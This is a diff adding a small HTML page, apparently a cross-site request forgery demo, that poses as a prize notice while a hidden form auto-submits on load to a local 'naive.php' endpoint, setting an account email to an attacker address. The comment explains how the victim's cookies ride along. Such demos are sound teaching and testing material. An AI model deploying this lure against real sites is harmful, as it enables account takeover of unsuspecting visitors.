@@ -1,0 +1,13 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>You've won!</title>
+
+<p>Claiming your prize...</p>
+
+<!-- A form aimed at someone else's site. The visitor never sees it; the
+     script submits it the moment the page loads, and the browser sends the
+     other site's cookies along with it. -->
+<form id="prize" method="post" action="http://localhost:8000/naive.php">
+    <input type="hidden" name="email" value="attacker@example.net">
+</form>
+<script>document.getElementById('prize').submit();</script>
